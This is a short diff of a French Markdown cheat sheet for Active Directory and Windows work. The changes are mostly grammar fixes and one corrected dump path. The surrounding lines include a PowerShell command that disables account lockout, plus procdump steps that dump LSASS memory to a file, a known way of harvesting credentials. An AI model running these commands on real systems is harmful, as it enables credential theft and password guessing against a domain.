@@ -538,7 +538,7 @@ Get-ADDefaultDomainPasswordPolicy
 
 <br>
 
-### Ne jamais bloquer le compte avec des faux mots de passe
+### Ne jamais bloquer de compte avec des faux mots de passe
 ```powershell
 Set-ADDefaultDomainPasswordPolicy -LockoutThreshold 0
 ```
@@ -946,7 +946,7 @@ sl C:\Windows\Temp\Dump
 Expand-Archive .\Procdump.zip
 ```
 
-### Ouvrir un shell avec tout les privilèges activés
+### Ouvrir un shell avec tous les privilèges activés
 
 Cette commande doit être exécutée en tant qu'administrateur (SeDebugPrivilege)
 ```shell
@@ -970,7 +970,7 @@ lsass.exe
 ```
 
 
-Exécuter Procdump dans l'invite système powershell et envoyer le fichier dump dans C:\Windows\Temp\Procdump
+Exécuter Procdump dans l'invite système powershell et envoyer le fichier dump dans C:\Windows\Temp\Dump\lsadump.dmp
 ```bat
 cd C:\Windows\Temp\Dump\Procdump
 procdump64.exe -ma lsass.exe C:\Windows\Temp\Dump\lsadump.dmp
